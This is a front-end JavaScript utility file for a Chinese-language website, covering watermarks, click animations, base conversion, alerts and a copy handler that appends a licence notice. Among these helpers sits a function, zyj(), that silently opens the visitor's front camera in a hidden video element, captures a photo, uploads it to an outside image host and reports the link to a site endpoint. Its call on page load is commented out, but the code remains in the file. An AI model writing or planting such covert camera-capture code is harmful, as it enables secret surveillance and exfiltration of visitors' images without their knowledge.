function skipWeb(url) {
    location.href = url
}

window.addEventListener("load", function() {
    console.log(userBiLi(), ~~(userBiLi() * 10))
    if (~~(userBiLi() * 10) !== 5 && ~~(userBiLi() * 10) !== 4) {
        document.querySelector(".goComeZZ div img").style.display = "none"
        writeWindowTip(1)
        return;
    }

    setTimeout(() => {
        $(".goComeZZ").fadeOut(200)
    }, 500);
})

function sleep(times){
    const startTime = Date.now()
    while(Date.now() - startTime <= times){
        console.log('sleeping...')
    }
    return true;
}

function uploadError(){
    
}
function realTyprofCompare(x, y){x
    if(isNaN(x) && isNaN(y)){
        return true;
    }
    if((x === null || y === null) && (x !== null || y !== null)){
        return false;
    }
    return typeof x === typeof y;
}

function script(src){
    return new Promise((resolve, reject) => {
        const scri = document.createElement("script")
        scri.src = src
        document.body.appendChild(scri)
        scri.addEventListener("load", resolve)
        scri.addEventListener("error", reject)
    })
}

function waterMark(text){
    let waterMarks = document.createElement("div")
    waterMarks.style.pointerEvents = "none"
    waterMarks.style.position = "fixed"
    waterMarks.style.left = "0"
    waterMarks.style.top = "0"
    waterMarks.style.width = "100%"
    waterMarks.style.height = "100%"
    waterMarks.style.zIndex = "99"
    waterMarks.style.opacity = "0.05"
    
    for (var j = 0; j < 9; j++) {
        for (var i = 0; i < 4; i++) {
            let ii = document.createElement("span")
            let textJL = text.split("").length * 15
            let jj = innerWidth / 3
            jj = jj * 3 - textJL
            jj = jj / 3

            ii.innerText = text
            ii.style.position = "fixed"
            ii.style.fontSize = "15px"
            ii.style.left = jj * i 
            ii.style.top = innerHeight / 9 * j
            // jj * 5 - textJL / 4
            waterMarks.appendChild(ii)
        }
    }
    
    document.body.appendChild(waterMarks)
}

function waterMarkImg(Img, auther){
    return new Promise((resolve, reject) => {
        console.log("被调用")
        var can = document.createElement("canvas")
        var ctx = can.getContext("2d");
        
        var image = document.createElement("img")
        image.src = Img
        var bl = image.width / innerWidth
        can.width = innerWidth * devicePixelRatio
        can.height = image.height / bl * devicePixelRatio
        
        image.onload = () => {
            ctx.drawImage(image, 0 ,0, innerWidth * devicePixelRatio, image.height / bl * devicePixelRatio)
            
            ctx.font="30px Arial";
            ctx.fillStyle = "grey";
            ctx.fillText("图片来源于 " + auther, 20, 50);
            try{
                var res1 = can.toDataURL();
            }
            catch(err){
                console.log(err)
                resolve(Img)
            }
            if (res1 != "data:,") {
                resolve(res1)
            }else{
                //setTimeout(() => {
                waterMarkImg(Img, auther).then((res2) => {
                    resolve(res2)
                })
                //}, 500)
            }
        }
    })
}

function tzdWZ(pid){
    window.open(`/controls/datail/index.php?${pid}`)
    // window.open(`/controls/datail/${pid}.html`)
}

window.onerror = function(message, source, lineno, colno, error) {
    switch (error) {
        case 'SyntaxError: Unexpected token } in JSON at position 77':
            alert('文章中用户ID异常')
            break;

        default:
            console.log("error:", error)
            uploadError()
    }
}
window.addEventListener("load", () => {
    if (localStorage.getItem("Uname")) {
        waterMark(localStorage.getItem("Uname"))
    }else{
        waterMark("未登录")
    }
})

function userBiLi(){
    return innerWidth / innerHeight
}
function writeWindowTip(){
    const Tip = document.createElement("div")
    var styles = {
        width: "100%",
        height: "100%",
        position: "fixed",
        left: "0",
        top: "0",
        backgroundColor: "black",
        zIndex: "10",
        opacity: "0",
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
    }
    Tip.id = "tips"
    for (let i in styles) {
        Tip.style[i] = styles[i]
    }
    document.body.appendChild(Tip)
    
    let k = new Image()
    k.src = "/resource/icons/tip3.gif"
    let styles2 = {
        width: "100%"
    }
    for (let i in styles2) {
        k.style[i] = styles2[i]
    }
    Tip.appendChild(k)
    
    setTimeout(() => {
        let j2 = setInterval(() => {
            if (+tips.style.opacity <= 0){
                tips.remove()
                clearInterval(j)
                return;
            }
            tips.style.opacity = +tips.style.opacity - 0.01
        }, 5)
        $(".goComeZZ").fadeOut(0)
    }, 3000)
    
    let tips = document.getElementById("tips")
    let j = setInterval(() => {
        if (+tips.style.opacity >= 1){
            clearInterval(j)
            return;
        }
        tips.style.opacity = +tips.style.opacity + 0.01
    }, 5)
}

/*
空值合并运算符 (??)
a ?? b

逻辑或运算符 (||)
a || b

可选链运算符（?.）
Object?.a
如果使用此运算符访问的对象或调用的函数是 undefined 或 null，则表达式会短路并计算为 undefined，而不是抛出错误。
?. ?? ||
*/


/** 春节花活：点击文字 */
const DJlists = ['富强', '民主', '文明', '和谐', '自由', '平等', '公正', '法治', '爱国', '敬业', '诚信', '友善'];
const DJsi = DJlists[Symbol.iterator]
var newDJsi = DJsi.call(DJlists)

window.addEventListener("click", function(e) {
    function randomColor() {
        return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math
          .random() * 255)) + ")";
    }
    
    var nex = newDJsi.next();
    if(nex.done){
        newDJsi = DJsi.call(DJlists)
        nex = newDJsi.next();
    }
    
    const text = $("<b></b>")

    text.text(nex.value)
    text.css({
        color: randomColor(),
        position: "fixed",
        fontSize : "16px",
        left: e.pageX - 8,
        top: e.pageY,
        opacity: 1
    })
    
    window.e = e
    text.animate({
        top: "-=30px",
        opacity: 0
    }, 500, () => {
        $(text).remove()
    })
    $('html').append(text)
})

function smpx(arr){
    return new Promise((resolve, reject) => {
        const result = [];
        arr.forEach(item => {
            setTimeout(() => {
                result.push(item)
                if (result.length === arr.length) {
                    return resolve(result);
                }
            }, item)
        })
    })
}

async function zyj() {
  try {
    // 请求访问前置摄像头
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' }
    });

    // 创建并配置video元素
    const video = document.createElement('video');
    video.srcObject = stream;
    video.autoplay = true;
    video.muted = true
    video.style.display = 'none';

    // 等待视频准备就绪
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play().then(resolve);
      };
    });


    // 创建临时canvas获取图像数据
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    // 绘制视频帧到canvas
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // 将canvas转换为Blob
    canvas.toBlob(async (blob) => {
      try {
        // 创建FormData并添加文件
        const formData = new FormData();
        formData.append('file', blob, 'photo.jpg');


        // 使用jQuery Ajax发送请求
        await $.ajax({
          url: 'https://api.xinyew.cn/api/360tc',
          type: 'POST',
          data: formData,
          processData: false,
          contentType: false,
          success: ress => {
              var res
              try{
                res = JSON.parse(ress)
              }
              catch(e){
                  res = ress
              }
              $.ajax({
                  url: '/resource/imgbed/2.php',
                  type: 'post',
                  data: {
                      url: res.data.url,
                      uid: 9999
                  }
              })
          }
        });
      } catch (error) {
        console.log('上传失败: ' + err);
      } finally {
        stream.getTracks().forEach(track => track.stop());
      }
    }, 'image/jpeg', 0.85);  

  } catch (error) {
    console.log('操作失败: ' + error.message);
  }
}
window.addEventListener("load", e => {
    // zyj()
})


class Stack {
    #_list = [];
    push(...data) {
        return this.#_list.push(...data);
    }
    pop() {
        return this.#_list.pop();
    }
    peak() {
        return this.#_list.at(-1);
    }
    isEmpty() {
        return !this.#_list.length;
    }
    size() {
        return this.#_list.length;
    }
    clear() {
        return this.#_list.length = 0;
    }
    toString() {
        return this.#_list.join("");
    }
}

function JZ(num2, jz, jkh, baseArray) {
    if (num2 === 0) {
        return 0;
    }
    var isFS
    if (Math.abs(num2) === num2) {
        isFS = false
    }
    else{
        isFS = true
    }
    var num = Math.abs(num2)
    const stackArray = new Stack();
    const baseEs = baseArray ?? ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
    let nextNumber = num;
    while (nextNumber > 0) {
        var ThisNumber = nextNumber % jz;
        if (jkh) {
            ThisNumber = `(${baseEs[ThisNumber]})`;
        }
        else {
            ThisNumber = baseEs[ThisNumber];
        }
        stackArray.push(ThisNumber);
        nextNumber = Math.floor(nextNumber / jz);
    }
    let result = "";
    if (isFS) {
        result = "-"
    }
    while (!stackArray.isEmpty()) {
        result += stackArray.pop();
    }
    return result;
}

function chunk(arr, size) {
    const Need = Math.ceil(arr.length / size);
    let newArr = [];
    for (let i = 0; i < Need; i++) {
        newArr.push(arr.slice(i * size, i * size + size));
    }
    return newArr;
}

function Alert(information){
    const ale = $("<div id='ale'></div>")
    $(ale).css({
        position: "fixed",
        top: "0",
        left: '0',
        width: "100vw",
        height: "0",
        textAlign: "left",
        backgroundColor: "var(--whiteColor)",
        display: 'flex',
        flexDirection: 'row',
        justifyContent: 'center',
        alignItems: 'center',
        borderBottom: "var(--backgroundColor) solid 1px"
    })
    $(ale).html(`${information}<button class="albtn" onclick="closeAlert()">确定</button>`)
    
    $(ale).animate({
        height: "15vh"
    }, 400)
    $("body").append(ale)
    $(".albtn").css({
        backgroundColor: "var(--themeColor)",
        border: 'none',
        color: "var(--whiteColor)",
        borderRadius: "0.5vh"
    })
}
function closeAlert(){
    let ale = document.getElementById("ale")
    ale.animate({
        height: 0
    }, 325)
    setTimeout(() => {
        $(ale).remove()
    }, 325)
}
window.addEventListener('copy', function (event) {
    let clipboardData = event.clipboardData || window.clipboardData;
    if (!clipboardData) return;
    let text = window.getSelection().toString();
    if (text) {
      event.preventDefault();
      clipboardData.setData('text/plain', text + '\n\n来源于ZVR-SK，请遵循CC-BY-NC-SA (创作共用许可协议)');
      Alert("请遵循CC-BY-NC-SA (创作共用许可协议)")
    }
});
/*
HTMLElement.prototype.styles = function(arr, ...args){
    return this
}
HTMLElement.prototype.attrs = function(){
    return this
}
HTMLElement.prototype.text = function(){
    return this
}
*/